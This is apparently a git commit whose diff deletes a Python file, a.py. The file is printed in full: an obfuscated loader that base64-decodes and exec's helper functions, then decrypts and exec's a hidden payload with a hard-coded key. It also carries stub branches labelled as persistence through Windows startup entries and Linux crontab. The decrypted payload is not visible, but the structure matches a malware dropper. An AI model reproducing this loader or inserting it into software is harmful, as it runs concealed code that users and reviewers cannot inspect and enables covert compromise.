64d9b75de2a55e2e582cd98b530047e2e4bd9bb8
Teror Fox <i@trfox.top>
2025-07-30 14:19:54 +0800

    删除 a.py 文件，移除不再使用的代码

--- a.py
+++
@@ -1,23 +0,0 @@
-# coding=UTF8
-import base64,re,os,sys
-# Generated on 2025-07-30 13:33:49
-s1=r'''rÃ|´´°´o²¸Ã||oY¼¾Ã¾{ÂÂ®³¼ÈÅÁ®Y¼¾ÃÂ²´{»±±Â{ÃÄÃÃ¼Y¾oo½Á½´ooÃÈYoooooo¾ºÃÂ²´w{Â²´}¢¡xooooÂ²½´wv}}}voxoooo±´ºoo´²¿ooooÃ¼}»´wx»ÂÁ²}½°ºv{ÂÁ²wxª¬³ÂÁ²wxÆ¸´»½³oooo³zo}´Å»|»½³x´´w»±³²¼ÁÂw°´±´¾´³xovvoÌOGGGW\WTWXaZ[U\^_GG 1GG_\G¡S[SGOP1GGaGGGGdUYGzj{lt1GGGGUOXXXXSXZP1GGGG1GG1GGGGZ1GGOeNGU[PW1GGU1GOPc1GGGdOGGOP1¡U]U]OPS¢aP'''
-s2=r"ZGVmIHBhcnNlS2V5KGtleSk6CiAgICBpZiBrZXkgIT0gIiI6CiAgICAgICAgbyA9IDAKICAgICAgICBmb3IgayBpbiBrZXk6CiAgICAgICAgICAgIG4gPSAwCiAgICAgICAgICAgIGkgPSBzdHIob3JkKGspKQogICAgICAgICAgICBmb3IgdCBpbiBpOgogICAgICAgICAgICAgICAgbiArPSBpbnQodCkKICAgICAgICAgICAgbyArPSBuCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgaWYgbyA8IDEwOgogICAgICAgICAgICAgICAgbyA9IGludChvICogMikKICAgICAgICAgICAgZWxpZiBvID4gMTAwOgogICAgICAgICAgICAgICAgbyA9IGludChvIC8gMikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJldHVybiBvCiAgICByZXR1cm4="
-s3=r"ZGVmIGRlY3J5cHQoZGF0YSxrZXkpOgogICAgaWYgZGF0YSA9PSAiIjoKICAgICAgICByZXR1cm4KICAgIHJlc3VsdCA9ICIiCiAgICBrZXljb2RlMSA9IHBhcnNlS2V5KGtleSkKICAgIGEgPSBsZW4oZGF0YSkgLy8gMgogICAgYjEgPSBkYXRhWzphXQogICAgYjIgPSBkYXRhW2E6XQogICAgYyA9IFtvcmQoZCkgZm9yIGQgaW4gYjFdCiAgICBlID0gW2YgLSBrZXljb2RlMSBmb3IgZiBpbiBjXQogICAgZyA9IHN0cihzdW0oYykpCiAgICBrZXljb2RlMiA9IHBhcnNlS2V5KGcpCiAgICBoID0gW29yZChpKSBmb3IgaSBpbiBiMl0KICAgIGogPSBbayAtIGtleWNvZGUyIGZvciBrIGluIGhdCiAgICBrID0gbGVuKGUpIC8vIDIKICAgIGdyb3VwMSA9IGVbOmtdCiAgICBncm91cDQgPSBlW2s6XQogICAgZ3JvdXAyID0gals6a10KICAgIGdyb3VwMyA9IGpbazpdCiAgICBkYXRhbGVuZ3RoID0gbGVuKGdyb3VwMSkgKyBsZW4oZ3JvdXAyKSArIGxlbihncm91cDMpICsgbGVuKGdyb3VwNCkKICAgIGwgPSBkYXRhbGVuZ3RoIC8vIDQKICAgIG0gPSBbXQogICAgZm9yIG4gaW4gcmFuZ2UobCk6CiAgICAgICAgbS5hcHBlbmQoZ3JvdXAxW25dKQogICAgICAgIG0uYXBwZW5kKGdyb3VwMltuXSkKICAgIG8gPSBbXQogICAgZm9yIHAgaW4gcmFuZ2UobCk6CiAgICAgICAgby5hcHBlbmQoZ3JvdXAzW3BdKQogICAgICAgIG8uYXBwZW5kKGdyb3VwNFtwXSkKICAgIHEgPSBtICsgbwogICAgZm9yIHIgaW4gcToKICAgICAgICBpZiBub3Qgcj09MDoKICAgICAgICAgICAgcmVzdWx0ICs9IGNocihyKQogICAgcmV0dXJuIHJlc3VsdAo="
-key = r'''^0|n_EXbNq3_|)N3]TMNi&H!KGVFy(f.'''
-
-# 持久化代码 (仅用于测试环境)
-try:
-    import platform
-    if platform.system() == "Windows":
-        # Windows启动项
-        pass
-    elif platform.system() == "Linux":
-        # Linux crontab
-        pass
-except:
-    pass
-
-exec(base64.b64decode(s2))
-exec(base64.b64decode(s3))
-exec(decrypt(s1,key))
